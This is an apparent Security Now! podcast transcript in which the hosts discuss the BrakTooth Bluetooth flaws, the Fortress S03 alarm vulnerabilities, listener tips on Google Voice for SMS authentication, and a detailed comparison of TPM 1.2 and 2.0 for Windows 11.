So here again with BrakTooth, we have researchers who, because this technology is closed, have been forced to hack into and reverse engineer important implementations of technology that will be used by millions of people.  And once shipped and sold, will almost certainly never be updated, once it's in the field.  The good news this time is that being Bluetooth, the attack range is short.  And that most of the flaws found simply crash or, in their language, Brak the stack.  So, okay.  That's good.  But this is another of those things where there are doubtless many agencies spread around the world who are sucking up these vulnerabilities and may very well have applications for many of them today.  How many movies have we seen where somebody "runs a bypass" on a keypad to gain entry into a protected area?  That fictional scenario is becoming less and less farfetched with each passing year or month because all this stuff can be hacked.



The trouble is these IoT things will probably never be fixed.  Microsoft cannot manage to get their deployed Exchange servers patched.  So what chance does the manufacturer of a residential alarm system have?  It's got to be near zero.  But first they have to want to, and care to.  At least we know Microsoft eventually decides, oops, you know, we'd better patch this.  So you have to want it in the first place for there to be any chance at all.  But do the manufacturers of IoT things care?  Why would they?  They've already got their customers' money.  



We are rapidly filling the world with a bunch of incredibly complex crap that ships the moment it stops crashing in the lab.  And that's an entirely different result from having potentially mission-critical technologies being actively resistant to attack and abuse.  They're obviously not.  The moment anyone starts poking at our stuff, it collapses.  So these researchers just showed us once again that the world we're living in today is one where hoping for the best is apparently all we can do.  If I sound disgusted, yes, you know, it's true.



Which brings us to our next story.  Attackers can now remotely disable Fortress WiFi Home Security Alarms.  Two vulnerabilities have been discovered by Rapid7, a well-known security research group, in the Fortress S03 WiFi Home Security System that can be abused by a malicious party to gain unauthorized access with an aim of altering the system's behavior, including disarming the devices without the victim's knowledge.  Just because I was curious, Fortress S03, is that around?  I put a link in the show notes to Amazon's Fortress Security Store, where there you can find the Fortress S03 and buy it.  I don't advise anyone do that, by the way.



The two unpatched issues were discovered and reported, as I said, by Rapid7 back in May.  And they honored a 60, actually more than that, let's see, May, June, July, August, yeah, we're in September now.  More like they honored a 60-day disclosure deadline and gave Rapid7 an extra 30 days, so more than 90 days.  So let me say that again.  Fortress was notified of these problems in May.  They've done nothing.  The Fortress S03 WiFi Home Security System is described as a do-it-yourself, you know, a DIY alarm system where you buy the various pieces and hang it on the wall and stick them on the windows and things, that enables users to secure their homes, kind of, and small businesses, maybe, from burglars, fires, gas leaks, and water leaks by leveraging WiFi and RFID technology for keyless entry.  Yeah, very keyless.



According to Fortress's website, its security and surveillance systems are used by "thousands of clients and continued customers."  Not me.  I hope not by any of our listeners.  And if you happen to have one, maybe go shake their tree because they haven't apparently even fixed it themselves, like for new stuff.



Rapid7 describes the vulnerabilities as being "trivially easy to exploit."  Now, I should note they waited three months.  They just posted full exploit details on their site.  So it was trivial before, if you knew how.  Now everyone knows how, and it's even more trivial.  So they noted that CVE-2021-39276 concerns an unauthenticated API Access - so, you know, it has to be it's only hard to use if you don't know about it, but if you do, you can because it's unauthenticated - that enables an attacker in possession of a victim's email address to query the API to leak the device's IMEI identity number, which also doubles as its serial number.



Armed with the device's IMEI number and the email address, the adversary can proceed to make a number of unauthorized changes, such as disabling the alarm system via an unauthenticated POST, you know, an HTTP POST request without the owner's knowledge.  While this is not usually much of a concern for random, opportunistic home invaders, they write, this is particularly concerning when the attacker already knows the victim, meaning somebody who lives there or a business, who are securing their business with one of these things.  And of course it might be an ex-spouse or some other estranged relationship partner, like somebody who the business fired who's annoyed with them.  



The second vulnerability, CVE-2021-39277, presents similar problems, but requires less prior knowledge of the victim, as the attacker can simply stake out the property and wait for the victim to use the RF-connected devices within radio range.  In other words, these things are sending and receiving information without authentication.  The attacker can then replay the "disarm" command at any later time, without the victim's knowledge, and voila, walk right in.



And now that Rapid7 has made their disclosure, which of course as I said includes full details, anyone with a bit of tech savvy can have at it since Fortress apparently isn't concerned and/or may not be able even to field update their devices if they were concerned.  But they've evidenced no concern because they haven't patched it, having been given now more than 90 days.  So once again, this is the world we're living in today.  Hope for the best.  Hope is all we apparently have.



LEO:  Of course, I doubt that there's a firmware update patch for those little handheld remote devices; right?  How would you even update them?



STEVE:  Right, right.



LEO:  So they probably just go, well, oh well.  Oh well.



STEVE:  Yeah.  Wish we knew.  And apparently they're not bothering to fix them even for new ones being shipped.



LEO:  Well, that's what's disappointing.  They could fix it in new ones.



STEVE:  Yeah.



LEO:  Except then they'd have to patch everything because - ugh.  What a mess.



STEVE:  Yeah.  It is.  It is.  And as I said, we are filling the world with complicated crap, and - ugh. 



LEO:  [Growls]



STEVE:  Yeah, exactly.  Okay.  So after our discussion last week of our life hanging by a PIN, I got a bunch of great closing-the-loop feedback from our listeners.  I'll share three.



Steven - and it's funny.  I like this.  His Twitter name is Steven.  His Twitter handle is @wnevets.  And I recognized "evets" because that's Steve backwards.  So "nevets" is Steven backwards.  And so this is Steven W, apparently, who reversed his name.  Now, Steven, do not use this as your password.  It's not a good idea.  So he tweeted:  "I don't know if anyone has suggested this, but I use Google Voice to secure my SMS fallbacks for services that require it.  Taking over my Google Voice number requires taking over my Google account, which doesn't have SMS fallback enabled."



Jon tweeted, @JonMcD86:  "Hey, Steve.  In this week's Security Now! episode you touched on the perils of using SMS messaging to your cell phone for authentication.  I just wanted to throw one thing out there that I do that others might find useful.  For platforms that require SMS authentication," he wrote, "I like to use a Google Voice phone number to receive text messages that I protect using my personal YubiKey.  It's annoying having to sign into this account repeatedly, and it's far from a perfect solution.  But I feel like it's better than leaving this, as you put it, backdoor into my services where SMS recovery is a requirement."  He said:  "Anyway, huge fan.  I listen every week.  Keep up the great work."



And finally, Ant Lednev, tweeting under the same name:  "Hi, Steve.  As I am watching Security Now! and where you describe the T-Mobile, SMS, and LastPass with SMS issues, as well as banking requiring SMS, just want to mention that I am using Google Voice for this purpose.  It is protected by Google login and two-factor authentication, has an iPhone app, and you can access it from the browser, too.  Curious what your thoughts are on replacing cell SMS to VoIP SMS services."



And to everyone, these three and others, I just wanted to share this.  Obviously this is a win, to set up a Google Voice account, use the Google Voice number as your SMS.  And I guess it was - I think it was Jon who said it's a pain to log into that, but obviously you don't have to often, only when you're expecting to receive a text message in order to perform account recovery, which you have to go to the trouble of logging in and then capture an SMS text that you received at that phone number or that pseudo phone number, and then you'd have it.  So anyway, great tip.  I wanted to send the feedback from our listeners back to our listeners, for anyone who might find that useful.  Leo, do you know, is it free?  Is it a completely free service?



LEO:  That's a good question.



STEVE:  I did not look into it.



LEO:  It's free.  Yeah, you know, because I pay for Fi.  But I think they still offer it as free free, yeah.



STEVE:  Cool.



LEO:  Yeah.  My Google Voice got replaced when I used that number for Google's Fi service.  And now I pay for it.  But I think, yeah, I think it's free, yeah.



STEVE:  Alain (A-L-A-I-N) said:  "I've really come to like @Tailscale as my VPN replacement - enough, in fact, to write a review about it."  And I then have the link for anyone who's interested in the show notes.  He says:  "Thanks @SGgrc for mentioning it."  And so it's very - just the top of it is very brief.  I thought I would share this real-world experience.



He wrote:  "First off, I've tried configuring WireGuard multiple times, around six by my count, on different devices - an Ubuntu VM, a few Raspberry PIs, and a pfSense firewall - all with various versions of success.  None of my attempts ended up working fully, though.  I would be able to access internal resources, but not the Internet; the Internet, but nothing internal; or nothing at all."  He says:  "By this point there would be a Raspberry Pi-shaped hole in the window."  Meaning, obviously, he threw his Raspberry Pi out the window and left a Raspberry Pi-shaped hole.  He said:  "So I gave up."  And then he says:  "Bad tech guy.  Go sit in the corner and use a Windows machine for a while."



"Then," he writes, "during my weekly listen of Security Now!, Steve Gibson mentioned Tailscale as a service that uses WireGuard (Episode 830), and that it's really easy to configure.  I figured, why not?  Let's give it a go."  And he says, "...and I like it!  The highlights:  Works on Ubuntu, or any Linux distro for that matter.  Works on Mac/iOS devices.  Works on Windows.  Yay, I guess.  Works on Android.  It's fast."  He says:  "The free tier is very generous."  He says:  "The paid versions aren't bad either, especially 'Subnet router failover' on the Business plan!!"  So anyway, just wanted to share one last bit of happiness.



And Walt Stoneburner tweeted:  "Steve, enjoyed your last show's quick dive on assembly language and shout-out to SoftICE."  And that was actually, Leo, you prompted me to expand on my talking a little bit about my use of assembler.  And he says of SoftICE:  "Oh, how I miss that.  While I hope to high heaven that someday you write," meaning me, "an assembly language book that goes into your own..."



LEO:  He's shaking his head no, for those not watching.



STEVE:  Unh-unh, that will not happen, "...into your own personal thoughts and techniques..."



LEO:  You'd sell five copies.  Come on.



STEVE:  Yeah, "...based on years of real-world usage..."



LEO:  It would be [crosstalk].



STEVE:  Yeah, well, "...are there any resources you'd recommend over any others for experienced C programmers?"  Okay.  So I replied to Walt, recommending that if he's able to find anything written by Michael Abrash on eBay or in any used bookstore online or offline, that he would never regret spending a few bucks on anything that Michael Abrash ever took the time to write.  I own, and they're actually - let's see.  How can I - they're right there.



LEO:  Right above his head, folks.



STEVE:  Yes.  "The Zen of Assembly Language, Volume 1:  Knowledge."  And Michael obviously had some ambitions for other volumes.  There were never any others under that title.  But we got "The Zen of Code Optimization," "The Zen of Graphics Programming," and "Michael Abrash's Graphics Programming Black Book," which is a big monstrous collection of his various articles.  Now, they were written back in the days when memory and CPU cycles were both ultra scarce and highly prized.  I mean, this is the code that allowed Doom and Quake especially, actually Michael was one of the authors of Quake...



LEO:  John Carmack, who wrote Doom, said he based a lot of his stuff, including the Mode Y video mode, on Abrash's work.



STEVE:  Yeah.



LEO:  He was a big fan.



STEVE:  And sadly, those days have passed. I'm still writing that way myself, not because it makes any practical sense, but because I apparently love moving known-size data, and not very large data, around between registers and memory.  I was thinking about this.  The best analogy, because I keep solving the same problem over and over and over, and I love it every time, it would be to a craftsman who loves to build homes by hand, loves measuring each piece of timber, planing its surface to make it smooth, and fitting the perfectly sized pieces together, pounding each nail in separately.  And once that's done, standing back, taking a slow deep breath and taking quiet personal pride in a really nice piece of work.  And it doesn't matter whether anyone else appreciates it or even ever sees it.  It wasn't done for anyone else.  It's something you did for yourself, for the sheer joy of using your hands to solve a collection of little puzzles.  I've never found anything as satisfying as coding.



LEO:  I agree, 100%.



STEVE:  Electronics for me is up there, too.  I really do like problem-solving with an environment that has constraints, you know, like how do I solve this problem with these pieces?  But anyone who loves coding for its own sake in any language might google the phrase "programming gems."  That's sort of become the catchphrase for the art form side of coding.  Coding and algorithms are complex enough that particularly elegant solutions often exist.



So I recall, back at the start of my implementation of SQRL, I needed to quickly look up a user-interface string by its index.  So I needed a dictionary that I could access at very high speed.  The way to do that is with a binary search.  And though I'd already implemented countless binary searches through the years, the planets that day must have been in perfect alignment because I wrote the most elegant binary search for 32-bit Intel assembler I had ever written in my life.  Its use of registers, condition codes, and conditional branching, I mean, it was just perfect.  And, yeah, I know.  Talk about hyper-geeky.  But that's where I live.



LEO:  That's very satisfying, though.  There's something just incredibly satisfying when you've got something like that.  Are you saying "gems," or do you mean "Programming Pearls," the Jon Bentley series?



STEVE:  Well, I think that's a little specific.  If you do google "programming gems," you'll find a bunch of stuff.



LEO:  The problem is unfortunately Ruby now calls its libraries Gems.  And so there's going to be collision there.  But, yeah.  The "Programming Pearls" book is exactly what you describe, which is a bunch of kind of clever algorithmic solutions that make you go, oh, ooh, ah.



STEVE:  In that case, yes, I would say "Programming Pearls," too.



LEO:  It's a classic.  



STEVE:  That's a good tip.



LEO:  I was looking for a book, one of Abrash's books.  His "Zen of Assembly Language Programming" is available used on Amazon for $488.  It's a collector because it's 30 years old.



STEVE:  Yeah.  It's beautiful.  Actually I pulled it down off the shelf...



LEO:  It's long out of print.



STEVE:  I pulled it off the shelf this morning, just to look around through it.



LEO:  Nice.



STEVE:  Yeah.



LEO:  Yeah, I don't think people write assembly language books much anymore.



STEVE:  No.



LEO:  Don't think there's a huge market for it.  Apparently the last job he took in 2014 was at Oculus, doing VR.



STEVE:  That's where he is, yeah, yeah.  He's like chief scientist at Oculus.



LEO:  Isn't that awesome?  Yeah.



STEVE:  Yeah.  And I'm sure he's trying to bring the latency down because that makes everyone nauseous.



LEO:  Exactly why he's there.



STEVE:  Oculus rhymes with nauseous.  One final tweet.  Steve Yates tweeted:  "Thanks, @SGgrc.  InitDisk has just rescued a 64GB USB key that failed to respond to anything else."  And I just wanted to take the moment to remind our listeners that this is always the way I operate.  Remember that when I began the work on SpinRite, the first thing I did was to solve the problem of absolutely, finally, once and for all, permanently solving the problem of formatting thumb drives because that's the way people would be running with SpinRite, no longer putting it on a floppy and then booting a floppy.



And it turns out it's a lot tougher to do that than you'd expect, which is why for example nothing else would format Steve Yates' USB key other than InitDisk.  I did once and for all solve that problem.  And so InitDisk exists, and many people discover that it's their tool of last resort that allows them to bring a drive back to life, a thumb drive that just appears to be dead.  InitDisk will do it.  So just a reminder about that.



And now, believe it or not, Peter Hamilton has been involved in the creation of a short book.  The title is "Light Chaser," and it was co-authored by Peter F. Hamilton and Gareth L. Powell.  It was quietly released two weeks ago, on August 24th.  And I wouldn't have been aware of it if I hadn't been looking for something else when Amazon brought it to my attention.



LEO:  See, those recommendations do work.



STEVE:  Uh-huh.  I thought the same thing.



LEO:  The first one.



STEVE:  The Nerd Daily had this short little blurb to say.  The Nerd Daily wrote:  "Peter F. Hamilton and Gareth L. Powell team up in this explosive, action-packed novella about a love that transcends lifetimes and is powerful enough to destroy an empire.  Amahle is a traveler who sails through the universe with nothing for company but the ship's AI.  Known throughout the universe as a 'light chaser,' her route takes her to worlds throughout The Domain, where she collects memories in exchange for various goods.  But she discovers memories from different lives and different worlds that are meant for her and seem to be from the same person.  She begins to question her entire existence.  Each memory..." and blah blah blah.



What I liked about it is that it says:  "For a shorter book, this story packs an incredible punch.  'Light Chaser' comes in at 173 pages, yet it is epic and expansive, taking us through worlds and lifetimes in rapid succession.  Rather than feeling rushed or lacking, the prose is razor sharp, carving out exactly what we need to understand the world and the technology while propelling us forward."  And I should just mention I read about five or six reviews.  They all fall on that point.  They talk about how it is fast, but compelling.  And what made me think of it, of course, is you and I, Leo, have talked about how sometimes we get lost in Hamilton's writing.



LEO:  There's a lot of details, yeah.



STEVE:  With like, blah, blah blah, blah blah.  And it's like, okay, well, maybe it's interesting that he found one of his pants legs to be too long that morning.  But okay, why do I have to know that?  So this might sort of be like ultimate Hamilton, where you just get the good bits, and you don't have to go to the tailor in order to make sure that your hems are the same, because we really don't need to know that.  What we do really need to know is what we're going to talk about next.



Okay.  So let's begin with a quick discussion about why any of this TPM stuff is needed at all.  The presumption is that once an operating system has taken possession of a system's hardware, configured and placed its processors into protected mode,  there's no possible way for anything to happen on the system that the operating system cannot intercept and consider.  In other words, programs running under such an operating system are supposed to be 100% absolutely contained as an OS client.  They're unable to do anything that the operating system does not explicitly allow.  Any unallowed action, such as attempting to touch the system's underlying hardware, or read or write outside of fixed boundaries, will raise an exception condition.  This causes the offending client instruction to be suspended before it's able to take its action, and returns control to the operating system for consideration of what to do.



Now, this might be something benign, such as a client attempting to access some valid memory that it does have access to, but which has been swapped out of the system's RAM to its virtual memory backing store.  In such a case, the OS will schedule the RAM to be retrieved for its client and will briefly suspend the client until its instruction that triggered the memory exception can be restarted, and then it will succeed.



So in an ideal world, once it's started, the operating system has all the tools it needs to actively supervise, manage, and control all of the subsequent activity occurring on the system.  And for the most part this works.  As we know, it's still an imperfect system because operating systems have become incredibly complex, and human programmers make mistakes.  As a result, the designers of malicious software keep finding ways to circumvent this control to elevate the privileges of clever clients that they design.  This allows their malicious clients to obtain the same access rights and privileges as the underlying operating system, thus completely escaping the operating system's attempts to control and thereby obtain free rein over the system.



So the ambition of truly secure computing continues to face the challenge of maintaining control over its deliberately misbehaving malicious clients once it's in control.  But this assumes that the operating system has not somehow been first maliciously modified, either while it's in cold storage, before it's been booted, or before it's able to finish booting and assume that control over the system's processors and other hardware.  In other words, it's becoming quite difficult to attack an operating system once it has control of the system because, mistakes notwithstanding, human error which occurs, modern processor technology can provide absolute control.  But what protects the operating system itself from being maliciously modified before it has the opportunity to begin protecting itself?



The answer is the Trusted Platform Module or, more generically, some form of Hardware Root of Trust.  This is shortened, popularized, and simply referred to as "Secure Boot."  Security Now! Episode 500, which we recorded a little over six years ago on March 24th, 2015, was titled "Windows Secure Boot."  So I'll refer any of our listeners who want more details about exactly how this works step-by-step to that podcast.  And all of that remains entirely relevant today.  And we talked about all the various keys that are used.  Step by step, we broke down the entire process of going from a motherboard with a Trusted Platform Module that had some secrets embedded in it all the way up to Windows operating and all the stages in between.



But the simple fact is secrets are required for security.  And the protocols which are used to verify those secrets must be tamperproof.  There must be some things an attacker does not know, cannot know, and cannot manipulate.  This will prevent an attacker from subverting the operation of an otherwise completely open and publicly known system.  For example, we're only able to believe that we're connecting to the proper remote Internet service because the certificate it presents contains a valid signature that's been signed by the secret private key maintained by a third party whom we trust to have verified the attested identity of the remote service.  Or another example:  When two agencies wish to conduct a private conversation in plain sight, they use a key agreement protocol to derive a temporary secret key which they'll then use to encrypt their subsequent communications.



No matter how open any system is, there must be someplace where secrets can be privately manipulated so that no one, not even someone having complete access and visibility into the system, can interfere with the system's intended operation.  In the case of a personal computer, where an attacker, or an attacker's code, might have access to the system before the operating system has booted, there must be a little black box of some kind which is beyond any attacker's ability to interfere or manipulate.  The Trusted Computing Group has carefully defined a minimal set of features and functions to standardize the operation of such a black box and has named it the Trusted Platform Module.



As suggested by the title of this podcast and the controversy surrounding Microsoft's determination to raise the version requirements of a system's TPM from 1.2 to 2.0, there have been and are two major release versions of the Trusted Platform Module.  TPM 1.2 was first released 16 years ago, back in 2005, the first year of this podcast, and it received its final revision in 2011.  TPM 2.0 was first released nine years ago, in 2014, and was last tweaked two years ago in 2019.  And the reason it's possible to have a first release of v1.2 or 2.0 with subsequent tweaks that don't change the version is that the 1.2 and 2.0 refer to API definitions rather than implementations.



Now, the TPM is a thing.  It's often built into a system as a standalone chip soldered onto a laptop or desktop motherboard.  The Gigabyte desktop motherboard I'm using has a socket for an optional TPM; and, as we can see from the Amazon screenshot that I put in the show notes, this is a common option.  For those who are not looking at video, this shows - I just pulled this up.  I think I typed in "TPM module" into Amazon, and up came a bunch of them.  So this shows an ASUS TPM for $33.71, a Supermicro TPM for $39, and an ASRock TPM 2 for $29.01.  And then another one from ASUS.  And I didn't want to spend any more space on the show notes.  But this thing, I think it was a screen of one of seven.  And so this, like, scrolls on and on with all these modules.



So the historical logic employed by motherboard makers was that even though a TPM has been available for the past 16 years, it's certainly possible that someone might want one, but especially early on, no one really needed or cared.  So they were thinking, why burden the cost of a motherboard with something that would sit there unused for the most part?  Thus they just had little sockets.  And if you actually wanted a TPM, you could buy one aftermarket and plug it into the little socket.  And now your motherboard would be equipped with a TPM.



So of course this thinking is obviously changing now for those who want additional security.  And note that since a TPM is actually nothing more than a set of callable functions, it has an API.  There's nothing preventing it from being incorporated into a system's core silicon chipset.  And that's exactly what Intel has done.  Ever since Skylake, which is the 6th-gen systems, nearly all Intel CPUs have an embedded TPM 2.0 which Intel calls Platform Trust Technology, or PTT.  AMD CPUs have an embedded TPM 2.0 called fTPM ever since 2016's AM4 platform.  fTPM stands for firmware TPM.  It's also possible to do the entire TPM in software.  Microsoft has a pure software-only simulator.  But of course doing so loses all of the true security advantages of having secrets protected with an impenetrable black box of some kind.



Okay.  So what is a TPM?  The Trusted Computing Group's own white page describing their TPM is dry, incomplete, and states that TPM v1.2 is the latest current version.  So someone hasn't been paying much attention to keeping that page up to date.  To begin to answer this question, we'll turn to the source of all the controversy, Microsoft.  They both helped design and, of course, use the TPM.  What they wrote, it's a bit self-aggrandizing, but I want to share it since it provides a few surprising bits and pieces that aren't found elsewhere.



They said:  "Microsoft has led the architecture and adoption of the TPM since its inception.  Microsoft invented and contributed the attestation, sealing, and Platform Configuration Register (PCR) features to the original TPM, and contributed to the overall design.  More recently, Microsoft architected and edited the TPM 2.0 specification.  Many new concepts and features were introduced with TPM 2.0, including crypto-agility, easier management, a more flexible authorization model, and better extensibility.  TPM 2.0 devices are now available from many vendors and are incorporated into most business-class PCs and many servers.  TPM 2.0 is also making increasing inroads into network equipment, mobile, and IoT devices.



"The TPM 2.0 specification is unique in that it is machine readable.  Most of the normative behavioral specification is written in a subset of the C programming language, and the TPM programming interface is defined in machine-readable tables. This allows vendors to quickly build high-quality and interoperable TPM implementations.  The TPM is a low-cost, but powerful and flexible, cryptoprocessor.  A TPM does many of the things that a smartcard or hardware security module (HSM) does,  For example, it's able to create, manage, and use cryptographic keys, as well as store confidential data.  But a TPM is intimately tied into how a computer boots and runs, which means it is far more powerful and useful than a simple 'smartcard on the motherboard.'



"For example, platforms that incorporate TPMs measure" - that's the PCRs - "measure and log the software that boots on the device.  The resulting boot log can be used to verify that devices are running known software and are up to date using a TPM feature called 'quoting' or 'attestation.'  The boot log can be used to protect keys for disk encryption because the TPM incorporates a feature called 'sealing' that can be used to make sure the encryption key is only disclosed to authorized software, and not to disk-cracking tools.  Other advanced TPM features include a secure clock, monotonic counters, meaning counters that will only count upwards, a non-volatile storage facility, and very flexible and secure mechanisms for key management operations like key import and export."



Okay.  So we have a bit of an overview.  Most of the articles describing TPM 1.2 vs 2.0 get stuck on the fact that 2.0, being newer, adds support for some additional newer and stronger cryptographic primitives.  Specifically, the original TPM 1.2 builds in functions for SHA-1; HMAC-160, which is HMAC based on SHA-1; 1024 and 2048-bit RSA public key ciphers.  To those functions, TPM 2.0 adds the 256-bit flavors of SHA and HMAC, so SHA-2 256 and HMAC-256.  2.0 also adds several 256-bit elliptic curve ciphers and elliptic curve Diffie-Hellman.



Since TPM 2.0 is backward compatible with TPM 1.2, software could simply continue using the TPM 1.2 functions, even if you had TPM 2.0, to run on platforms having either TPM standard.  And this is, of course, what Windows 10 does today and will continue to do for the next four years until October 14th, 2025, which is the targeted end-of-support date for Windows 10.  And we may see the extended support for cost, which Microsoft is currently doing with Windows 7.



But Microsoft may have decided that it's time to force a change.  We've seen and discussed countless examples of this throughout the life of the podcast.  It's no longer possible to connect to remote web servers over SSL 2, and usually not over SSL 3.  And when I go to Ivan Ristic's terrific SSL Labs facility to ask it about GRC.com, it says:  "This server supports TLS 1.0 and TLS 1.1.  Grade capped to B."  So you can't support anything older than TLS v1.2 if you want to get an "A" from Ivan.  I don't.  I would rather support older protocols because that's better for GRC, and I can live with Ivan's "B."



And we know that forcing a change in protocols just for the sake of forcing a change, when the currently used protocols appear to be working just fine, is always going to be painful.  So if Microsoft wants to force their Secure Boot and other TPM-dependent technologies forward with Windows 11, they'll want to drop support for the older SHA-1 and HMAC-160 and insist upon having Windows 11 only rely upon and use the newer 256-bit crypto technologies.  And of course there are other new crypto technologies in TPM 2.0 that are not part of 1.2.



But there may be three things, or there are three things, that Microsoft may have missed.  The first is that dropping old and adding newer crypto technologies has traditionally been a matter of upgrading a server or client's software.  If your browser doesn't support the latest protocol, you click on "upgrade."  But in the case of TPM, the cryptography is locked into the hardware.  By design, it cannot be upgraded because it must be designed to be an inviolate black box.  So while it's easy for Microsoft to say, "We're going to require the use of 256-bit crypto technologies which are missing from TPM 1.2 and are present only in TPM 2.0," not only is it not easy, it's not possible for Windows users to fix this with a software upgrade.



The second thing they've missed is the lack of any compelling reason to move from Windows 10 to Windows 11.  During last week's Windows Weekly, Mary Jo expressed her puzzlement about the entire thing, asking Paul whether there was anything truly new about Windows 11 beyond  and she really asked this  its centered Start Menu and its rounded corners.



LEO:  It might have been me that asked that.  But it's definitely a good question.



STEVE:  You guys have all been asking.  And this was Mary Jo Foley, who would know, if anyone in the world would; right?  She would normally be all over it.  Paul in this instance shrugged and joked that there were, after all, quite a few corners that had needed to be rounded during the creation of Windows 11.  So, yeah, you know, they did a lot of work there.



And the third thing Microsoft may have missed is that many people using Windows 10 today are not using any features of TPM, regardless of edition.  They aren't booting with Secure Boot enabled.  They don't use BitLocker.  They don't even have TPM enabled.  They don't want or care about those things.  So the security profile of these people suggests that TPM doesn't matter to them at all.  Yet Microsoft is planning on denying these people the option of moving to Windows 11 for no reason other than that features they are not using, and presumably have no interest in ever using, are absent from their hardware.  No nicely rounded corners for them.



So Microsoft appears to be saying:  "We've decided to force a change to Windows that no one really needs because we want to force people to use more modern hardware even if they don't need more modern hardware."  This doesn't feel like a winning strategy to me.  When I was introducing TPM 2.0, I said that most of the articles describing TPM 1.2 vs 2.0 get stuck on the fact that 2.0, being newer, adds support for some additional newer and stronger cryptographic primitives.  The point I was making is that there's more to 2.0 than just stronger and newer crypto.



Okay.  So first I'll enumerate the five functions that TPM 1.2 offers, then the six additional features which the architects of TPM, among whom Windows or Microsoft clearly feels that they number, added in the move from 1.2 to 2.0.  Okay.  So TPM 1.2 provides for identification of devices.  Prior to the release of the TPM spec, devices were mostly identified by MAC addresses or IP addresses, not security identifiers.  Okay.  So that tells us something we have not really paid attention to.  There is a unique serial number of some sort in the TPM which software is able to query.



Second, secure generation of keys.  Having a hardware random number generator is a big advantage when creating keys.  We know about that.  A number of security solutions have been broken due to poor key generation.  And actually we covered this at the time on the podcast.  The Infineon implementation of TPM 1.2 actually had a problem with its RSA key generation, and they needed to do a big mea culpa and fix that, and did.  Also, the secure storage of keys is the third feature of 1.2, like of all TPM.  Keeping good keys secure, particularly from software attacks, is a big advantage that the TPM design brings to a device.



Fourth, NVRAM.  When an IT organization acquires a new device, it often wipes the hard disk and rewrites the disk with the organization's standard load.  Having nonvolatile RAM allows a TPM to maintain a certificate store, meaning across that wipe.  And, finally, device health attestation.  Prior to systems having TPMs, IT organizations used software to attest to system health.  But if a system was compromised, it might report it was healthy - of course it would - even when it wasn't.



Okay.  Those things exist in all TPMs.  With the passage of time and the benefit of experience with TPM 1.2, TPM 2.0 then added the following:  algorithm agility.  Algorithms can be changed without revisiting and revising the specification, should they prove to be cryptographically weaker than expected.  So that's cool.  We don't need to change the spec anymore.  We can just extend its algorithms.  Enhanced authorization.  This new capability unifies the way all entities in a TPM are authorized, while extending the TPM's ability to enable authorization policies that allow for multifactor and multiuser authentication.  Additional management functions are also included.  So this sort of feels like something Microsoft had a hand in, in 2.0.



Quick key loading.  Loading keys into a TPM used to take a relatively long time.  They now can be loaded quickly, using symmetric rather than asymmetric encryption.  As we know, we talked about this, asymmetric encryption is actually incredibly slow.  It's cool what it does, but it does not do it quickly.  Therefore nobody uses asymmetric encryption to bulk encrypt anything.  What everybody does is use a high-quality pseudo random number generator, or hopefully a true hardware random number generator, to get a large, completely random key.  You then use asymmetric encryption only to encrypt it.  And then you use the symmetric key with a lightning-fast symmetric cipher to do the actual bulk encryption.  So anyway, 2.0 makes key loading way quicker. 



Also what they describe as non-brittle PCRs, those are the Platform Configuration Registers.  In the past, locking keys to device states caused management problems.  Often, when a device state had to go through an authorized state change, keys had to be changed, as well.  This is no longer the case.  So they just created some additional architectural stages, a little more architectural complexity to decouple some things.



Also, flexible management.  Different kinds of authorization can be separated, allowing for much more flexible management of TPM resources.  Again, that sounds like something Microsoft probably pushed as a result of experience with the TPM 1.2.  And, finally, identifying resources by name.  Indirect references in the TPM 1.2 design led to security challenges.  Those have been fixed by using cryptographically secure names for all TPM resources.



Okay.  So those last things are the things that were added to the 2.0 spec on top of 1.2.  And for anyone who's interested, I found a fabulous reference.  I've got links to its PDF and its EPUB version.  It's titled "A Practical Guide to TPM 2.0."  It's over on the Springer Link site.  Again, link's in the show notes.  Fabulous reference.



Okay.  So Microsoft provides us a chart of their technologies which require TPM 2.0 and which will not run under 1.2.  Actually, it provides two columns showing us which ones run everywhere and which only run under 2.0.  I've got a link in the show notes.  And Leo, thank you.  You brought the chart up on the podcast.  I'm going to run through these to give our listeners a sense for what we're seeing.  Basically, what we're seeing is 14 items.  The TPM 2.0 column is all checked in green because all 14 run with it.  In the TPM 1.2 column, we're missing four features out of 14.  The other 10, they work just fine under 1.2.



The so-called Measured Boot instruments the booting process, storing the history in the TPM to detect future tampering.  Microsoft says that it runs fine under TPM 1.2 today, right now.  Microsoft says that BitLocker runs equally well under 1.2 and 2.0.  However, they explain that Device Encryption requires TPM 2.0, and that it's not available with 1.2.  Okay, well, device encryption is actually kind of watered-down BitLocker.  Since BitLocker, which is actually superior, runs with either of the TPMs, unless you're a Windows Home user without BitLocker the lack of device encryption is a "who cares."  The only place it is important is if you're a Home user, you will have device encryption, so you get the watered down version of BitLocker, if that matters to you.



The Windows Defender Application Control runs under either TPM. Microsoft explains what that's about.  For Microsoft Edge, this Application Guard helps to isolate enterprise-defined untrusted sites, protecting, they say, your company while your employees browse the Internet.  As an enterprise administrator, you define what's among trusted websites, cloud resources, and internal networks.  Everything not on your, basically it's a whitelist, is considered untrusted.  If an employee goes to an untrusted site through Microsoft Edge, the site is opened in an isolated Hyper-V-enabled container.  And what I just described runs fine under both TPMs.  Doesn't care.



Now, something called Windows Defender System Guard is a post-boot integrity verifier which works with the TPM to verify that Windows wasn't compromised during the boot.  That's sort of like it augments Secure Boot, and it does need 2.0.  Not available if all you've got is TPM 1.2, although Secure Boot is available.  



Seven other security features - Credential Guard, Device Health Attestation, Windows Hello, UEFI Secure Boot, TPM Platform Crypto Provider Key Storage Provider, Virtual Smart Card, and Certificate Storage - all work fine with either TPM 1.2 or 2.0.  No difference.



Something called Windows Autopilot does require 2.0.  I had to look that one up.  Microsoft describes it as a collection of technologies used to set up and preconfigure new devices, getting them ready for productive use.  Windows Autopilot can be used to deploy Windows PCs or HoloLens 2 devices.  Okay.  So maybe not a big loss if we don't have that under 2.0.  It's 2.0 only.  And finally, SecureBIO, also known as Microsoft Enhanced Sign-in, requires TPM 2.0.  This is an enterprise-targeted biometric identity system.  Now, that's the case, even though Windows Hello, which provides a lot of the same features, also works just fine under only TPM 1.2.



Okay.  So in conclusion, there are no obvious showstopping technologies present in TPM 2 that we cannot readily live without if all we have is TPM 1.2.  If all we have is 1.2, we get BitLocker, but not the watered-down, feature-stripped Device Encryption.  We don't get the enterprise double-check-after-boot System Guard, but no one running Windows outside of an enterprise would have either of those anyway.  We also don't get Autopilot or SecureBIO, even though we do get fully functional Windows Hello.  In other words, while TPM 2.0 might enable a few extra features for the enterprise, TPM 1.2 provides everything that typical Windows users need, which is what we have today.



